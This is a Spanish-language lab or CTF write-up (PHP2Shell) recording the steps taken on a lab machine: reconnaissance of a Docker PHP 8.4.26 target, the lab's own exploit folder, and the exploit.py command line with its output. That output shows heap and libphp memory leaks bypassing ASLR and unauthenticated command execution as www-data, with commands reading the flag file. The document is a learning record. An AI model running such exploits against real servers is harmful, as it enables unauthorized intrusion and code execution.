# Evidencias — PHP2Shell

## 1. Inicio de la sala y máquina de laboratorio

La sala arranca una máquina de laboratorio (Ubuntu 24.04.1 LTS) accesible por SSH/terminal
web, con IP `10.66.150.208`.

![Introducción de la sala](./evidencias/01-room-intro.png)
![Terminal inicial](./evidencias/02-conexion-ssh-lab.png)

## 2. Reconocimiento del objetivo

Dentro de la máquina de laboratorio corre un contenedor Docker con el servicio vulnerable:

```
docker ps --format '{{.Names}} {{.Image}} {{.Status}}'
php2shell-target   php:8.4.26-apache   Up 5 minutes
```

![docker ps](./evidencias/03-docker-ps-target.png)

Se confirma la versión exacta del runtime PHP dentro del contenedor:

```
docker exec php2shell-target php -v
PHP 8.4.26 (cli) (built: Oct 21 2026 00:31:19) (NTS)
Zend Engine v4.4.26, Copyright (c) Zend Technologies
    with Zend OPcache v8.4.26, Copyright (c), by Zend Technologies
```

![php -v](./evidencias/04-php-version.png)

Se valida que el servicio web objetivo responde correctamente:

```
curl -s http://127.0.0.1:8088/index.php
OK
```

![curl index](./evidencias/05-curl-index.png)

Y se inspecciona el código fuente de la aplicación objetivo (trivial, solo confirma
disponibilidad del endpoint — la vulnerabilidad real está en el *runtime* de PHP, no en
este script de aplicación):

```php
docker exec php2shell-target cat /var/www/html/index.php
<?php echo "OK\n"; ?>
```

![index.php fuente](./evidencias/06-index-php-fuente.png)

## 3. Herramienta de explotación provista por el laboratorio

El laboratorio incluye una carpeta `php2shell-bypass-aslr-exp/` con el material de
investigación y el exploit ya desarrollado (notas sobre ASLR, heap leak, HTTP research,
y el script `exploit.py`):

```
ls ~/php2shell-bypass-aslr-exp
ASLR_PATHS.md          HTTP_HEAP_LEAK.md    NO_DISPLAY_ERRORS.md   exploit.py   readme_en.md
ASLR_PURE_HTTP.md      NOASLR_REPORT.md     README.md              lab          src
ASLR_PURE_HTTP_RESEARCH.md  NOTES.md        NOTES_BG.md            docker       tools
DISPLAY_ERRORS_OFF.md                                              logs         out
```

![listado carpeta exploit](./evidencias/07-exploit-folder-listing.png)

## 4. Explotación — Etapa de leak de memoria (CVE-2026-109618)

Ejecución del exploit contra el objetivo (`http://127.0.0.1:8088/index.php`) con el
comando `id` como prueba de concepto de ejecución de código:

```
python3 exploit.py -u http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] offsets loaded from .../out/offsets.env
[*] stage 1: heap leak (attempt 1/3)
[+] chunk base  = 0x7e47f5c00000
[*] stage 2: libphp leak (attempt 1/3)
[+] libphp base = 0x7e47f7799000
[+] stage 3: HTDATA=0x7e47f5c690d8 ZIF=0x7e47f7bfe370
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El exploit reconstruye, mediante una fuga de memoria del heap y de la librería `libphp`,
las direcciones necesarias para evadir ASLR — esto corresponde a **CVE-2026-109618**.

![leak y ejecución de id](./evidencias/08-exploit-id-command.png)

## 5. Explotación — De la fuga a shell (CVE-2026-109619)

Con las direcciones ya filtradas, se repite el ataque para ejecutar un comando arbitrario
(`cat /flag > /out/p1`) y se obtiene la prueba de la flag de la sala (RCE confirmada como
usuario `www-data`, sin autenticación previa). **La flag fue redactada** en la captura:

![ejecución y proof (flag redactada)](./evidencias/09-exploit-proof-redacted.png)

Esta segunda etapa —pasar de una simple fuga de memoria a ejecución de código arbitraria—
corresponde a **CVE-2026-109619**.

## 6. Cierre de la sala

Las 8 tareas quedaron completadas al 100%, incluyendo la tarea 7
("Detection, Mitigation and the Real Fix"), cuyo contenido se resume en
[`RECOMENDACIONES.md`](./RECOMENDACIONES.md).

![sala completada](./evidencias/10-room-completed-100.png)
